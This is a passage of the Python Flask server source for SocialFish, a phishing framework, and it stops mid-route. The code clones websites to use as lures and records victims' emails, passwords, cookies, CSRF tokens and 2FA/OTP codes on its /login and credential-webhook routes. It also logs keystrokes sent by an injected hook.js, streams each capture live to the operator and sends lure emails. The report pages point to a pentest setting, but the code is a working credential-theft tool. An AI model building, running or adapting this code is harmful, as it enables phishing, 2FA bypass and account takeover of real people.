#!/usr/bin/env python3
#
from flask import Flask, request, render_template, render_template_string, jsonify, redirect, g, flash, session, make_response, send_from_directory, Response, has_request_context
from flask_socketio import SocketIO, emit, join_room, leave_room
from core.config import *
from core.view import head
from core.scansf import nScan
from core.clonesf import clone
from core.dbsf import initDB
from core.genToken import genToken
from core.sendMail import sendMail
from core.tracegeoIp import tracegeoIp
from core.cleanFake import cleanFake
from core.genReport import genReport
from core.report import generate_unique
from core.db_migration import migrate_db
from core.tunnel_manager import TunnelManager
from core.recorder_playwright import PlaywrightRecorder
from core.cookie_inspector import CookieInspector
from core.recorder_selenium import SeleniumRecorder
from core.mock_server import MockLoginServer
from core.advanced_attacks import TabJacking, FileUploadInjection, AdvancedStealth, CAPTCHASolver
from core.page_analyzer import PageAnalyzer
from core.auth_flow_tester import OAuth2Tester, SSO_Tester, MFA_Tester, AdvancedAuthFlowTester
from core.real_cloner import RealCloner
from core.cookie_analyzer import CookieAnalyzer
from core.webhook_manager import WebhookManager
from datetime import date, datetime, timedelta
from sys import argv, exit, version_info
import colorama
import sqlite3
import flask_login
import os
import json
import hashlib
import asyncio
import re
import logging
import time
import requests
from pathlib import Path
import sys

# Configure logging
logger = logging.getLogger("SocialFish")
logger.setLevel(logging.INFO)

# Console handler with UTF-8 safe output (replace invalid chars)
try:
    stream = sys.stdout
    ch = logging.StreamHandler(stream)
    ch.setLevel(logging.INFO)
    formatter = logging.Formatter("%(asctime)s %(levelname)s %(name)s %(message)s")
    ch.setFormatter(formatter)
    logger.addHandler(ch)
except Exception:
    logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(name)s %(message)s")

# Verificar argumentos
if len(argv) < 2:
    print("./SocialFish <youruser> <yourpassword>\n\ni.e.: ./SocialFish.py root pass")
    exit(0)

# Temporario
try:
    users = {argv[1]: {'password': argv[2]}}
except IndexError:
    print("./SocialFish <youruser> <yourpassword>\n\ni.e.: ./SocialFish.py root pass")
    exit(0)
# Definicoes do flask
app = Flask(__name__, static_url_path='',
            static_folder='templates/static')
app.config['SEND_FILE_MAX_AGE_DEFAULT'] = 0

# Initialize SocketIO for live panel
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# Initialize managers
tunnel_manager = TunnelManager()
cookie_analyzer = CookieAnalyzer()
webhook_manager = WebhookManager()
cookie_inspector = CookieInspector(DATABASE)

# Inicia uma conexao com o banco antes de cada requisicao
@app.before_request
def before_request():
    try:
        g.db = sqlite3.connect(DATABASE)
        g.db.row_factory = sqlite3.Row
    except sqlite3.DatabaseError as e:
        logger.error(f"Database connection failed: {e}")
        return {"error": "Database connection error"}, 500
    except Exception as e:
        logger.error(f"Unexpected error during database connection: {e}")
        return {"error": "Internal server error"}, 500
    
    # Enforce HTTPS for sensitive routes if configured
    if FORCE_HTTPS and not request.is_secure:
        sensitive_routes = ['/configure', '/creds', '/tokens', '/sessions', '/api/', '/studio/', '/admin/']
        for route in sensitive_routes:
            if request.path.startswith(route):
                url = request.url.replace('http://', 'https://', 1)
                return redirect(url, code=301)

# Finaliza a conexao com o banco apos cada conexao
@app.teardown_request
def teardown_request(exception):
    if hasattr(g, 'db'):
        g.db.close()

@app.context_processor
def inject_admin_config():
    """Provide config defaults for all templates extending admin/index.html."""
    defaults = {
        'config_url': '',
        'config_red': '',
        'config_status': 'clone',
        'config_clone_id': '',
    }
    if not has_request_context() or not hasattr(g, 'db'):
        return defaults
    try:
        row = g.db.execute("SELECT url, red, status, clone_id FROM config LIMIT 1").fetchone()
        if row:
            return {
                'config_url': row[0] or '',
                'config_red': row[1] or '',
                'config_status': row[2] or 'clone',
                'config_clone_id': (row[3] or '') if len(row) > 3 else '',
            }
    except Exception:
        pass
    return defaults

# Ensure `socialfish` table has a default row and provide safe getters
def ensure_socialfish_row(conn):
    try:
        # `conn` may be a sqlite3.Connection; use its execute which returns a cursor
        conn.execute("""CREATE TABLE IF NOT EXISTS socialfish (
                                            id integer PRIMARY KEY,
                                            clicks integer,
                                            attacks integer,
                                            token text
                                        ); """)
        cur = conn.execute("SELECT id FROM socialfish WHERE id = 1")
        if cur.fetchone() is None:
            t = genToken()
            conn.execute('INSERT INTO socialfish(id,clicks,attacks,token) VALUES(?,?,?,?)', (1, 0, 0, t))
            conn.commit()
    except Exception as e:
        print(f'[-] ensure_socialfish_row error: {e}')


def sf_get(cur, column, default=None):
    try:
        # Whitelist allowed columns to prevent SQL injection
        allowed_columns = {'clicks', 'attacks', 'token'}
        if column not in allowed_columns:
            return default
        row = cur.execute(f"SELECT {column} FROM socialfish where id = 1").fetchone()
        return row[0] if row and row[0] is not None else default
    except Exception:
        return default

# Conta o numero de credenciais salvas no banco
def countCreds():
    count = 0
    cur = g.db
    select_all_creds = cur.execute("SELECT id, url, pdate, browser, bversion, platform, rip FROM creds order by id desc")
    for i in select_all_creds:
        count += 1
    return count

# Conta o numero de visitantes que nao foram pegos no phishing
def countNotPickedUp():
    count = 0

    cur = g.db
    select_clicks = cur.execute("SELECT clicks FROM socialfish where id = 1")

    for i in select_clicks:
        count = i[0]

    count = count - countCreds()
    return count

# Extract credential fields from form data for structured storage
def extract_credential_fields(form_data, request=None):
    """
    Extract common credential fields from form submission data.
    Includes cookies, CSRF tokens, and 2FA codes.
    Returns a dict with extracted fields for direct database storage.
    """
    extracted = {
        'email': None,
        'username': None,
        'password': None,
        'cookies': None,
        'csrf_tokens': None,
        '2fa_code': None,
        'form_fields': list(form_data.keys()) if form_data else []
    }
    
    # Common field name variations for credentials
    email_fields = ['email', 'email_address', 'user_email', 'e-mail', 'mail', 'address']
    username_fields = ['username', 'userid', 'user_id', 'login', 'account', 'user', 'name']
    password_fields = ['password', 'passwd', 'pwd', 'pass', 'secret', 'token']
    
    # CSRF token field name variations
    csrf_fields = ['csrf_token', '_token', 'authenticity_token', '__RequestVerificationToken', 'XSRF-TOKEN', '_csrf', 'verification_code']
    
    # 2FA/OTP field name variations
    twofa_fields = ['code', 'otp', 'totp', 'mfa_code', '2fa_code', 'verification_code', 'confirm_code', 
                    'auth_code', 'backup_code', 'recovery_code', 'authenticator_code', 'app_code',
                    'sms_code', 'email_code', 'push_approval']
    
    # Extract cookies from HTTP request
    if request:
        try:
            cookies_dict = request.cookies.to_dict()
            if cookies_dict:
                extracted['cookies'] = json.dumps(cookies_dict)
        except Exception as e:
            logger.debug(f"[EXTRACT] Could not capture cookies: {e}")
    
    if form_data:
        # Try to extract email
        for field in email_fields:
            for key in form_data.keys():
                if field.lower() in key.lower():
                    extracted['email'] = form_data[key]
                    break
            if extracted['email']:
                break
        
        # Try to extract username
        for field in username_fields:
            for key in form_data.keys():
                if field.lower() in key.lower() and key.lower() not in password_fields:
                    extracted['username'] = form_data[key]
                    break
            if extracted['username']:
                break
        
        # Try to extract password
        for field in password_fields:
            for key in form_data.keys():
                if field.lower() in key.lower():
                    extracted['password'] = form_data[key]
                    break
            if extracted['password']:
                break
        
        # Try to extract CSRF tokens
        csrf_found = {}
        for field in csrf_fields:
            for key in form_data.keys():
                if field.lower() in key.lower():
                    csrf_found[key] = form_data[key]
        if csrf_found:
            extracted['csrf_tokens'] = json.dumps(csrf_found)
        
        # Try to extract 2FA codes
        twofa_found = {}
        for field in twofa_fields:
            for key in form_data.keys():
                if field.lower() in key.lower() and key.lower() not in password_fields:
                    twofa_found[key] = form_data[key]
        if twofa_found:
            extracted['2fa_code'] = json.dumps(twofa_found)
    
    return extracted

def save_victim_session(cur, url='', template_id=1, form_data=None, extracted=None, clone_id=''):
    """Insert a victim session row using whatever columns exist in the sessions table."""
    try:
        cols_info = cur.execute("PRAGMA table_info(sessions)").fetchall()
        columns = {c[1] for c in cols_info}
        if not columns:
            return None

        session_hash = hashlib.sha256(
            f"{request.remote_addr}{datetime.now().isoformat()}{os.urandom(6).hex()}".encode()
        ).hexdigest()[:16]
        victim_ip = request.remote_addr
        victim_ua = request.headers.get('User-Agent', 'Unknown')
        session_url = url or clone_id or 'unknown'
        form_json = json.dumps(form_data or {})
        cred_json = json.dumps(extracted if extracted is not None else (form_data or {}))

        field_values = {
            'template_id': template_id,
            'session_hash': session_hash,
            'url': session_url,
            'victim_ip': victim_ip,
            'victim_ua': victim_ua,
            'status': 'captured',
            'form_data': form_json,
            'submitted_credentials': cred_json,
            'forms_detected': len(form_data or {}),
        }

        insert_cols = [c for c in field_values if c in columns]
        if not insert_cols:
            return None

        placeholders = ', '.join(['?'] * len(insert_cols))
        cur.execute(
            f"INSERT INTO sessions({', '.join(insert_cols)}) VALUES({placeholders})",
            tuple(field_values[c] for c in insert_cols)
        )
        g.db.commit()
        return session_hash
    except Exception as e:
        logger.debug(f"[SESSION] Could not save victim session: {e}")
        return None

#----------------------------------------

# definicoes do flask e de login
app.secret_key = APP_SECRET_KEY

# Session configuration for persistent authentication
app.config['REMEMBER_COOKIE_DURATION'] = timedelta(days=7)
import os
is_production = os.environ.get('SOCIALFISH_PRODUCTION', '0') == '1'
# Allow HTTP for localhost/dev/tunnel, secure only for real HTTPS
if is_production:
    app.config['REMEMBER_COOKIE_SECURE'] = True
    app.config['SESSION_COOKIE_SECURE'] = True
    app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
else:
    app.config['REMEMBER_COOKIE_SECURE'] = False
    app.config['SESSION_COOKIE_SECURE'] = False
    app.config['SESSION_COOKIE_SAMESITE'] = 'None'
app.config['REMEMBER_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_HTTPONLY'] = True

from flask_wtf import CSRFProtect
from flask_wtf.csrf import CSRFError, generate_csrf
csrf_protect = CSRFProtect(app)

# Enforce HTTPS in production
if is_production:
    @app.before_request
    def enforce_https():
        if not request.is_secure:
            url = request.url.replace('http://', 'https://', 1)
            return redirect(url, code=301)
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(days=7)
app.config['SESSION_REFRESH_EACH_REQUEST'] = True
app.config['PRESERVE_CONTEXT_ON_EXCEPTION'] = False

login_manager = flask_login.LoginManager()
login_manager.init_app(app)
login_manager.login_view = 'admin'
login_manager.session_protection = 'strong'

class User(flask_login.UserMixin):
    def __init__(self, user_id):
        self.id = user_id
        # is_authenticated is handled automatically by UserMixin

@login_manager.user_loader
def user_loader(email):
    logger.debug(f"[user_loader] Loading user: {email}")
    if email not in users:
        logger.warning(f"[user_loader] User not found: {email}")
        return None
    
    user = User(email)
    logger.debug(f"[user_loader] User loaded successfully: {email}")
    return user

# ---------------------------------------------------------------------------------------

# Rota para o caminho de inicializacao, onde e possivel fazer login
@app.route('/neptune', methods=['GET', 'POST'])
@csrf_protect.exempt  # Login endpoint is exempt from CSRF (standard security pattern)
def admin():
    # se a requisicao for get
    if request.method == 'GET':
        is_auth = flask_login.current_user.is_authenticated
        logger.debug(f"[GET /neptune] User authenticated: {is_auth}, User ID: {getattr(flask_login.current_user, 'id', 'None')}")
        if is_auth:
            return redirect('/creds')
        else:
            return render_template('signin.html')

    # se a requisicao for post, verifica-se as credencias
    if request.method == 'POST':
        try:
            email = request.form.get('email', '').strip()
            password = request.form.get('password', '').strip()
            
            # Validate input
            if not email or not password:
                flash('Email and password required.', 'danger')
                return render_template('signin.html'), 400
            
            if email not in users:
                logger.warning(f"[LOGIN] Failed login attempt - user not found: {email}")
                flash('Invalid credentials.', 'danger')
                return render_template('signin.html'), 401
            
            if password != users[email]['password']:
                logger.warning(f"[LOGIN] Failed login attempt - wrong password: {email}")
                flash('Invalid credentials.', 'danger')
                return render_template('signin.html'), 401
            
            # Credentials are correct - create user and log them in
            logger.info(f"[LOGIN] Authenticating user: {email}")
            user = User(email)
            session.permanent = True
            app.permanent_session_lifetime = timedelta(days=7)
            flask_login.login_user(user, remember=True)
            logger.info(f"[LOGIN] User {email} logged in successfully")
            logger.info(f"[LOGIN] Session ID: {request.cookies.get('session', 'NO_SESSION_COOKIE')}")
            return redirect('/creds')
        except Exception as e:
            logger.error(f"[LOGIN] Error during login: {type(e).__name__}: {e}")
            flash('Internal server error. Please try again.', 'danger')
            return render_template('signin.html'), 500

# Custom error handler for CSRF errors (for other protected routes)
from flask_wtf.csrf import CSRFError
@app.errorhandler(CSRFError)
def handle_csrf_error(e):
    logger.warning(f"[CSRF] CSRF validation failed: {e.description}")
    return jsonify({'error': 'CSRF validation failed. Please try again.'}), 400

# funcao onde e realizada a renderizacao da pagina para a vitima
@app.route("/")
def getLogin():
    # Get config from database instead of global variables
    conn = g.db
    config = conn.execute("SELECT * FROM socialfish WHERE id = 1").fetchone()
    # Retrieve status and URL from config or use defaults
    cur = conn.execute("SELECT status, url, beef, red FROM config LIMIT 1")
    conf_row = cur.fetchone()

    if conf_row:
        sta, url, beef, red = conf_row[0], conf_row[1], conf_row[2], conf_row[3]
    else:
        sta = 'custom'
        url = 'http://localhost:5000/custom'
        beef = 'no'
        red = 'http://localhost:5000'
    
    # Log the click
    cur = g.db
    cur.execute("UPDATE socialfish SET clicks = clicks + 1 WHERE id = 1")
    g.db.commit()
    
    # Return appropriate template based on configuration
    if sta == 'clone':
        clone_id = None
        try:
            clone_row = conn.execute("SELECT clone_id FROM config LIMIT 1").fetchone()
            if clone_row and clone_row[0]:
                clone_id = clone_row[0]
        except Exception:
            pass

        if not clone_id and url:
            for variant in _clone_url_variants(url):
                clone_id = _find_clone_id_for_url(variant)
                if clone_id and (Path('templates/clones') / clone_id / 'index.html').exists():
                    break
                clone_id = None

        if clone_id and (Path('templates/clones') / clone_id / 'index.html').exists():
            return redirect(f'/clone/{clone_id}/')

        # Legacy pre-cloned fake/ layout
        agent_hash = 'default'
        url_hash = hashlib.md5(url.encode()).hexdigest()[:8]
        template_path = f'fake/{agent_hash}/{url_hash}/index.html'
        if Path(f'templates/{template_path}').exists():
            return render_template(template_path)

        logger.info("Clone mode active but no clone files found, using default form")
        return render_template('custom.html')
    
    # Default: return custom form or default template
    elif url == 'http://localhost:5000/custom':
        return render_template('default.html')
    else:
        return render_template('custom.html')

# funcao onde e realizado o login por cada pagina falsa
@app.route('/login', methods=['POST'])
@csrf_protect.exempt
def postData():
    if request.method == "POST":
        fields = [k for k in request.form]
        values = [request.form[k] for k in request.form]
        data = dict(zip(fields, values))
        browser = str(request.user_agent.browser) if request.user_agent else 'Unknown'
        bversion = str(request.user_agent.version) if request.user_agent else 'Unknown'
        platform = str(request.user_agent.platform) if request.user_agent else 'Unknown'
        rip = str(request.remote_addr)
        d = "{:%m-%d-%Y}".format(date.today())
        
        # Get redirect URL from config table
        cur = g.db
        conf_row = cur.execute("SELECT red FROM config LIMIT 1").fetchone()
        red = conf_row[0] if conf_row else 'http://localhost:5000'
        
        # Get the target URL from config
        url_row = cur.execute("SELECT url FROM config LIMIT 1").fetchone()
        url = url_row[0] if url_row else DEFAULT_CLONE_URL
        
        # Extract structured credential fields (pass request for cookie capture)
        extracted = extract_credential_fields(data, request)
        
        sql = """INSERT INTO creds(url, jdoc, pdate, browser, bversion, platform, rip, 
                                   email, username, password, cookies, csrf_tokens, 
                                   form_fields, captured_metadata) 
                 VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"""
        creds = (url, str(data), d, browser, bversion, platform, rip,
                 extracted['email'], extracted['username'], extracted['password'],
                 extracted['cookies'], extracted['csrf_tokens'],
                 json.dumps(extracted['form_fields']),
                 json.dumps({'browser': browser, 'version': bversion, 'platform': platform}))
        cur.execute(sql, creds)
        g.db.commit()
        save_victim_session(cur, url=url, form_data=data, extracted=extracted)

        # Get the inserted credential ID for WebSocket emission
        last_id = cur.execute("SELECT last_insert_rowid()").fetchone()[0]
        
        # Emit WebSocket event for live panel update
        try:
            socketio.emit('credentials_captured', {
                'id': last_id,
                'url': url,
                'ip': rip,
                'browser': browser,
                'bversion': bversion,
                'platform': platform,
                'date': d,
                'data_preview': str(list(data.keys()))[:50],
                'email': extracted['email'],
                'username': extracted['username']
            }, skip_sid=request.sid, broadcast=True, namespace='/')
            logger.info(f"Credential #{last_id} captured from {rip} - {browser}")
        except Exception as e:
            logger.error(f"Error emitting socket event: {e}")
    
    # Get redirect URL from config
    cur = g.db
    conf_row = cur.execute("SELECT red FROM config LIMIT 1").fetchone()
    red = conf_row[0] if conf_row else 'http://localhost:5000'
    
    return redirect(red)

# funcao para configuracao do funcionamento CLONE ou CUSTOM, com BEEF ou NAO
# REMOVED: Duplicate /configure route that was overridden by the canonical version at line 1227
# The echo() function has been consolidated into the configure() function below

# pagina principal do dashboard
@app.route("/creds")
@flask_login.login_required
def getCreds():
    cur = g.db
    # Ensure the socialfish row exists and get values safely
    ensure_socialfish_row(cur)
    attacks = sf_get(cur, 'attacks', 0)
    clicks = sf_get(cur, 'clicks', 0)
    tokenapi = sf_get(cur, 'token', '')
    # SQL returns (id, url, pdate, browser, bversion, platform, rip, email, username)
    # Index: 0=id, 1=url, 2=pdate, 3=browser, 4=bversion, 5=platform, 6=rip, 7=email, 8=username
    data = cur.execute("SELECT id, url, pdate, browser, bversion, platform, rip, email, username FROM creds order by id desc").fetchall()
    config_row = cur.execute("SELECT url, red, status, clone_id FROM config LIMIT 1").fetchone()
    config_url = config_row[0] if config_row else ''
    config_red = config_row[1] if config_row else ''
    config_status = config_row[2] if config_row else 'clone'
    config_clone_id = config_row[3] if config_row and len(config_row) > 3 else ''
    return render_template(
        'admin/index.html',
        data=data,
        clicks=clicks,
        countCreds=countCreds,
        countNotPickedUp=countNotPickedUp,
        attacks=attacks,
        tokenapi=tokenapi,
        config_url=config_url,
        config_red=config_red,
        config_status=config_status,
        config_clone_id=config_clone_id,
    )

# pagina para envio de emails
@app.route("/mail", methods=['GET', 'POST'])
@flask_login.login_required
def getMail():
    if request.method == 'GET':
        cur = g.db
        row = cur.execute("SELECT email, smtp, port FROM sfmail where id = 1").fetchone()
        if row:
            email, smtp, port = row[0], row[1], row[2]
        else:
            email, smtp, port = '', '', ''
        return render_template('admin/mail.html', email=email, smtp=smtp, port=port)
    if request.method == 'POST':
        subject = request.form['subject']
        email = request.form['email']
        password = request.form['password']
        recipient = request.form['recipient']
        body = request.form['body']
        smtp = request.form['smtp']
        port = request.form['port']
        sendMail(subject, email, password, recipient, body, smtp, port)
        cur = g.db
        cur.execute("UPDATE sfmail SET email = ? WHERE id = 1", (email,))
        cur.execute("UPDATE sfmail SET smtp = ? WHERE id = 1", (smtp,))
        cur.execute("UPDATE sfmail SET port = ? WHERE id = 1", (port,))
        g.db.commit()
        return redirect('/mail')

# Rota para consulta de log
@app.route("/single/<id>", methods=['GET'])
@flask_login.login_required
def getSingleCred(id):
    try:
        if not id.isdigit():
            return "Invalid ID"
        sql = "SELECT jdoc FROM creds WHERE id = ?"
        cur = g.db
        credInfo = cur.execute(sql, (id,)).fetchall()
        if len(credInfo) > 0:
            return render_template('admin/singlecred.html', credInfo=credInfo)
        else:
            return "Not found"
    except:
        return "Bad parameter"

# rota para rastreio de ip
@app.route("/trace/<ip>", methods=['GET'])
@flask_login.login_required
def getTraceIp(ip):
    import re
    # Validate IP format
    ip_pattern = r'^(\d{1,3}\.){3}\d{1,3}$|^127\.0\.0\.1$|^::1$|^[a-f0-9:]+$'
    
    if not re.match(ip_pattern, ip):
        return "Invalid IP format", 400
    
    try:
        traceIp = tracegeoIp(ip)
        return render_template('admin/traceIp.html', traceIp=traceIp, ip=ip)
    except Exception as e:
        print(f'[-] Trace error: {str(e)}')
        return "Network Error", 500

# API endpoint to save cloned page as template
@app.route("/api/save-template", methods=['POST'])
@flask_login.login_required
def save_clone_as_template():
    try:
        data = request.get_json()
        name = data.get('name', '')
        url = data.get('url', '')
        description = data.get('description', '')
        tags = data.get('tags', '')
        
        if not name or not url:
            return jsonify({'success': False, 'error': 'Name and URL required'}), 400
        
        # Get current user
        username = flask_login.current_user.id if hasattr(flask_login.current_user, 'id') else 'anonymous'
        
        # Ensure template name is unique; auto-append suffix if duplicate
        cur = g.db
        unique_name = name
        i = 1
        while cur.execute("SELECT id FROM templates WHERE name = ?", (unique_name,)).fetchone():
            unique_name = f"{name} ({i})"
            i += 1

        # Insert template into database
        cur.execute("""
            INSERT INTO templates (name, base_url, description, tags, created_by, created_at)
            VALUES (?, ?, ?, ?, ?, datetime('now'))
        """, (unique_name, url, description, tags, username))
        g.db.commit()

        logger.info(f"Template '{unique_name}' saved by {username}")
        return jsonify({'success': True, 'message': f'Template "{unique_name}" saved successfully!', 'name': unique_name})
    except Exception as e:
        logger.error(f"Error saving template: {str(e)}")
        return jsonify({'success': False, 'error': str(e)}), 500

# API endpoint to export cloned HTML
@app.route("/api/export-clone", methods=['POST'])
@flask_login.login_required
def export_clone():
    try:
        data = request.get_json()
        url = data.get('url', '')
        template_name = data.get('name', 'clone')
        
        if not url:
            return jsonify({'success': False, 'error': 'URL required'}), 400
        
        # Clone the URL
        cloned_html = clone(url)
        
        # Create template entry
        cur = g.db
        username = flask_login.current_user.id if hasattr(flask_login.current_user, 'id') else 'anonymous'
        
        cur.execute("""
            INSERT OR REPLACE INTO templates (name, base_url, description, tags, created_by, created_at)
            VALUES (?, ?, ?, ?, ?, datetime('now'))
        """, (template_name, url, f'Exported clone from {url}', 'exported', username))
        g.db.commit()
        
        logger.info(f"Clone exported and saved as template: {template_name}")
        return jsonify({
            'success': True,
            'message': f'Clone saved as template "{template_name}"',
            'template_name': template_name,
            'html_length': len(cloned_html)
        })
    except Exception as e:
        logger.error(f"Error exporting clone: {str(e)}")
        return jsonify({'success': False, 'error': str(e)}), 500

# Webhook endpoint for credential capture from injected JavaScript
@app.route("/api/credential-webhook", methods=['POST'])
@csrf_protect.exempt
def credential_webhook():
    """
    Webhook endpoint for capturing credentials from injected JavaScript.
    Called by hook.js when form is submitted on phished page.
    """
    try:
        cur = g.db.cursor()
        form_data = request.form.to_dict() if request.method == 'POST' else request.get_json() or {}
        victim_ip = request.remote_addr
        victim_ua = request.headers.get('User-Agent', 'Unknown')
        
        # Extract and normalize credential fields
        extracted = extract_credential_fields(form_data, request)
        
        # Create session for this webhook capture
        session_hash = hashlib.sha256(f"{victim_ip}{date.today()}webhook".encode()).hexdigest()[:16]
        
        # Store in creds table
        sql = """INSERT INTO creds(url, jdoc, pdate, browser, bversion, platform, rip, 
                 email, username, password, cookies, csrf_tokens, form_fields, captured_metadata) 
        VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"""
        
        d = "{:%m-%d-%Y}".format(date.today())
        creds = (
            request.referrer or 'webhook-capture',
            json.dumps(form_data),
            d,
            str(request.user_agent.browser) if request.user_agent else 'Unknown',
            str(request.user_agent.version) if request.user_agent else 'Unknown',
            str(request.user_agent.platform) if request.user_agent else 'Unknown',
            victim_ip,
            extracted['email'],
            extracted['username'],
            extracted['password'],
            extracted['cookies'],
            extracted['csrf_tokens'],
            json.dumps(extracted['form_fields']),
            json.dumps({'source': 'webhook', 'browser': request.user_agent.browser if request.user_agent else 'Unknown'})
        )
        
        cur.execute(sql, creds)
        g.db.commit()
        cred_id = cur.execute("SELECT last_insert_rowid()").fetchone()[0]
        save_victim_session(
            cur,
            url=request.referrer or 'webhook-capture',
            form_data=form_data,
            extracted=extracted,
        )

        logger.info(f"[WEBHOOK] Credential captured from {victim_ip} (ID: {cred_id})")
        
        # Emit WebSocket event
        try:
            socketio.emit('credentials_captured', {
                'id': cred_id,
                'ip': victim_ip,
                'browser': request.user_agent.browser if request.user_agent else 'Unknown',
                'email': extracted['email'],
                'source': 'webhook',
                'date': d
            }, skip_sid=request.sid if hasattr(request, 'sid') else None, broadcast=True, namespace='/')
        except Exception as e:
            logger.debug(f"Socket error: {e}")
        
        redirect_url = _get_config_redirect(cur)
        return jsonify({'status': 'ok', 'id': cred_id, 'redirect_url': redirect_url}), 200
        
    except Exception as e:
        logger.error(f"[WEBHOOK] Error in credential webhook: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Webhook endpoint for keylogger data
@app.route("/api/keys-webhook", methods=['POST'])
@csrf_protect.exempt
def keys_webhook():
    """
    Webhook endpoint for capturing keystrokes from injected JavaScript.
    Called by hook.js for real-time keystroke monitoring.
    """
    try:
        data = request.get_json() or {}
        keys = data.get('keys', '')
        victim_ip = request.remote_addr
        
        if not keys:
            return jsonify({'status': 'error', 'message': 'No keys provided'}), 400
        
        cur = g.db.cursor()
        session_hash = hashlib.sha256(f"{victim_ip}{date.today()}keylog".encode()).hexdigest()[:16]
        payload = json.dumps({'keystroke_data': keys, 'captured_at': datetime.now().isoformat()})
        existing = cur.execute(
            "SELECT id, form_data FROM sessions WHERE session_hash = ?", (session_hash,)
        ).fetchone()
        if existing:
            try:
                old = json.loads(existing[1] or '{}')
                old['keystroke_data'] = (old.get('keystroke_data', '') or '') + keys
                old['captured_at'] = datetime.now().isoformat()
                payload = json.dumps(old)
            except Exception:
                pass
            cur.execute("UPDATE sessions SET form_data = ? WHERE id = ?", (payload, existing[0]))
        else:
            cur.execute(
                "INSERT INTO sessions(session_hash, victim_ip, form_data, status) VALUES(?, ?, ?, ?)",
                (session_hash, victim_ip, payload, 'keylog')
            )
        g.db.commit()
        
        logger.debug(f"[KEYS] Keystroke data captured from {victim_ip} ({len(keys)} characters)")
        
        return jsonify({'status': 'ok', 'stored': len(keys)}), 200
        
    except Exception as e:
        logger.error(f"[KEYS] Error in keys webhook: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Main API endpoint for website cloning
@app.route("/api/clone", methods=['POST'])
@flask_login.login_required
@csrf_protect.exempt
def api_clone():
    """
    Main API endpoint for website cloning.
    Accepts URL and returns 3-URL set for phishing campaign.
    """
    try:
        data = request.get_json() or {}
        url = data.get('url', '')
        
        if not url:
            return jsonify({'status': 'error', 'message': 'URL required'}), 400
        
        # Validate URL format
        if not url.startswith(('http://', 'https://', 'ftp://')):
            url = 'https://' + url
        
        cur = g.db
        
        # Clone the website
        logger.info(f"[CLONE] Starting clone of {url}")
        cloned_html = clone(url)
        
        # Create template entry for this clone
        template_name = f"clone_{hashlib.sha256(url.encode()).hexdigest()[:8]}"
        
        # Insert template record for this clone
        cur.execute("""
            INSERT INTO templates (name, base_url, description, tags, status, created_by, created_at)
            VALUES (?, ?, ?, ?, ?, ?, datetime('now'))
        """, (
            template_name,
            url,
            '',
            '',
            'clone',
            getattr(flask_login.current_user, 'id', 'system')
        ))
        g.db.commit()

        # Retrieve the template id we just created
        template_row = cur.execute("SELECT id FROM templates WHERE name = ? ORDER BY id DESC LIMIT 1", (template_name,)).fetchone()
        template_id = template_row[0] if template_row else None

        # Generate a short hash for this clone to use as lure identifier
        import string
        rand = __import__('random')
        random_str = ''.join(rand.choices(string.ascii_letters + string.digits, k=10))
        lure_hash = hashlib.sha256(f"{template_id}{random_str}{int(datetime.now().timestamp())}".encode()).hexdigest()[:24]
        
        lure_url = f"http://localhost:5000/capture/{lure_hash}"
        localhost_url = f"http://localhost:5000/capture/{lure_hash}"
        webhook_url = f"http://localhost:5000/hook.js"
        
        # Store lure URL
        cur.execute("""
            INSERT INTO lure_urls(template_id, lure_hash, full_url, created_at)
            VALUES(?, ?, ?, datetime('now'))
        """, (template_id, lure_hash, lure_url))
        g.db.commit()
        
        logger.info(f"[CLONE] Clone completed - Template ID: {template_id}, URLs generated")
        
        return jsonify({
            'status': 'ok',
            'template_id': template_id,
            'urls': {
                'lure': lure_url,
                'localhost': localhost_url,
                'webhook': webhook_url
            },
            'clone_hash': lure_hash,
            'html_size': len(cloned_html)
        }), 200
        
    except Exception as e:
        logger.error(f"[CLONE] Error in clone API: {str(e)}")
        print(f"[ERROR] Clone API failed: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# rota para scan do nmap
@app.route("/scansf/<ip>", methods=['GET'])
@flask_login.login_required
def getScanSf(ip):
    import re
    # Validate IP format
    ip_pattern = r'^(\d{1,3}\.){3}\d{1,3}$|^127\.0\.0\.1$|^::1$|^[a-f0-9:]+$'
    
    if not re.match(ip_pattern, ip):
        return "Invalid IP format", 400
    
    return render_template('admin/scansf.html', nScan=nScan, ip=ip)

# rota post para revogar o token da api
@app.route("/revokeToken", methods=['POST'])
@flask_login.login_required
def revokeToken():
    revoke = request.form['revoke']
    if revoke == 'yes':
        cur = g.db
        new_token = genToken()
        cur.execute("UPDATE socialfish SET token = ? WHERE id = 1", (new_token,))
        g.db.commit()
        ensure_socialfish_row(cur)
        token = sf_get(cur, 'token', '')
    return redirect('/creds')

# pagina para gerar relatorios
@app.route("/report", methods=['GET', 'POST'])
@flask_login.login_required
def getReport():
    if request.method == 'GET':
        cur = g.db
        urls = cur.execute("SELECT DISTINCT url FROM creds").fetchall()
        users = cur.execute("SELECT name FROM professionals").fetchall()
        companies = cur.execute("SELECT name FROM companies").fetchall()
        uniqueUrls = []
        for u in urls:
            if u not in uniqueUrls:
                uniqueUrls.append(u[0])
        return render_template('admin/report.html', uniqueUrls=uniqueUrls, users=users, companies=companies)
    if request.method == 'POST':
        subject = request.form['subject']
        user = request.form['selectUser']
        company = request.form['selectCompany']
        date_range = request.form['datefilter']
        target = request.form['selectTarget']
        _target = 'All' if target=='0' else target
        genReport(DATABASE, subject, user, company, date_range, _target)
        generate_unique(DATABASE,_target)
        return redirect('/report')

# pagina para cadastro de profissionais
@app.route("/professionals", methods=['GET', 'POST'])
@flask_login.login_required
def getProfessionals():
    if request.method == 'GET':
        return render_template('admin/professionals.html')
    if request.method == 'POST':
        name = request.form['name']
        email = request.form['email']
        obs = request.form['obs']
        sql = "INSERT INTO professionals(name,email,obs) VALUES(?,?,?)"
        info = (name, email, obs)
        cur = g.db
        cur.execute(sql, info)
        g.db.commit()
        return redirect('/professionals')

# pagina para cadastro de empresas
@app.route("/companies", methods=['GET', 'POST'])
@flask_login.login_required
def getCompanies():
    if request.method == 'GET':
        return render_template('admin/companies.html')
